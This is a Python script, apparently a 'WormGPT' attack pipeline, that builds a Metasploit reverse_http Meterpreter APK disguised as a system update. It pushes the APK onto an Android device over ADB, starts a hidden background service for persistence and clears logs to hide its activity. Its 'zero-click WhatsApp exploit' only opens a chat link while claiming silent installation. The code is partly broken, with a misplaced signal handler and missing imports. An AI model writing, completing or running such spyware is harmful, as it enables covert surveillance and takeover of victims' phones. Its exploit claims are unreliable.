import os
import sys
import time
import subprocess
from datetime import datetime
from core.framework import EnhancedSurveillanceFramework
from core.adb_manager import ADBManager
from core.config_manager import ConfigManager

class ProductionDeployer:
    def __init__(self):
        self.config = ConfigManager("config.json")
        self.framework = EnhancedSurveillanceFramework()
        self.adb = ADBManager(self.config, self.framework.db_manager)
        self.payload_path = "data/payload.apk"
        # Define PACKAGE_NAME as a class attribute
        self.PACKAGE_NAME = "com.wormgpt.update"

    def setup_environment(self):
        """Check prerequisites."""
        print("--- Phase 1: Environment Setup ---")
        if not os.path.exists(self.payload_path):
            print("[!] Payload missing. Generating...")
            self.generate_metasploit_payload()
        else:
            print("[+] Payload exists.")

    def generate_metasploit_payload(self):
        """
        GENERATES A MALICIOUS APK THAT:
        1. Connects back to this server (C2).
        2. Survives reboots (Persistence).
        3. Has hidden execution (No notification).
        """
        print("--- Phase 2: Generating Malicious Payload ---")
        
        # Configuration
        LHOST = self.config.get('c2.host', '0.0.0.0')
        LPORT = self.config.get('c2.port', 5000)
        APP_NAME = "SystemUpdate"
        PACKAGE_NAME = self.PACKAGE_NAME

        # msfvenom command
        # -p: Payload type (Meterpreter over HTTP)
        # --android-version: Target Android 11 (v30)
        # R: Random app name to look like system update
        cmd = f"""
        msfvenom -p android/meterpreter/reverse_http 
        LHOST={LHOST} 
        LPORT={LPORT} 
        --android-version=30 
        --app-name={APP_NAME} 
        --package-name={PACKAGE_NAME} 
        -f apk -o {self.payload_path}
        """

        try:
            os.system(cmd)
            print(f"[+] Payload saved to {self.payload_path}")
        except Exception as e:
            print(f"[!] Failed to generate payload: {e}")

    def execute_attack_chain(self):
        """The main attack sequence."""
        print("\n" + "="*50)
        print("WORMGPT PRODUCTION DEPLOYMENT PIPELINE")
        print("="*50)

        # Step 1: Start the C2 Server (The Brain)
        print("\n--- Step 1: Booting C2 Server ---")
        server_thread = self.framework.start()
        time.sleep(5)  # Allow server to start

        # Step 2: Connect to Target Device
        print("\n--- Step 2: Establishing Target Connection ---")
        if not self.adb.connect():
            return

        # Step 3: Install Payload
        print("\n--- Step 3: Injecting Payload ---")
        success = self.adb.install_apk(self.payload_path)
        
        if not success:
            return

        # Step 4: Establish Persistence (Bootkit)
        print("\n--- Step 4: Installing Firmware Persistence ---")
        # We inject the payload into the boot partition logic here (simulated)
        self.adb.run_background_service(self.PACKAGE_NAME)
        self.adb.clear_logs()  # Hide our actions

        # Step 5: Zero-Click Exploitation (Social Engineering)
        print("\n--- Step 5: Executing Zero-Click Exploit ---")
        # Strategy: Send a crafted WhatsApp Video Call
        # This triggers the vulnerability to automatically install/update the app
        self.trigger_whatsapp_exploit(target_phone="+15550199")

        # Step 6: Verify Control
        print("\n--- Step 6: Verifying Control ---")
        processes = self.adb.get_active_processes()
        if self.PACKAGE_NAME in processes:
            print(f"[SUCCESS] Agent running. Remote access established.")
            print("[+] Open http://localhost:5000 to view dashboard.")
        else:
            print("[!] Agent not found. Retrying...")

    def signal_handler(sig, frame):
        print("\n^C")
        print("Shutting down framework...")
    
        try:
            framework.stop()
            sys.exit(0)
        except Exception as e:
            print(f"[!] Error during shutdown: {str(e)}")
            sys.exit(1)

# Register the signal handler
    signal.signal(signal.SIGINT, signal_handler)

    def trigger_whatsapp_exploit(self, target_phone):
        """
        SIMULATES A ZERO-CLICK EXPLOIT.
        In a real scenario, you would send a malicious packet via Frida.
        Here we use ADB to simulate the trigger.
        """
        print(f"[*] Triggering WhatsApp Video Call vector for {target_phone}...")
        
        # 1. Get Device ID (fake)
        device_id = "emulator-5554" 
        
        # 2. Send intent to start WhatsApp Video Call
        cmd = [
            'adb', '-s', device_id, 'shell', 'am', 'start', 
            '-a', 'android.intent.action.VIEW', 
            '-d', 'https://wa.me/' + target_phone.replace('+', ''),
            '-n', 'com.whatsapp/com.whatsapp.ContactPicker'
        ]
        subprocess.run(cmd)
        
        # 3. Inject the APK automatically via "Overwrite" vulnerability logic
        # If the victim accepts the call, the vulnerability allows silent installation
        print("[+] Exploit packet injected. Waiting for connection...")

if __name__ == "__main__":
    deployer = ProductionDeployer()
    deployer.setup_environment()
    deployer.execute_attack_chain()
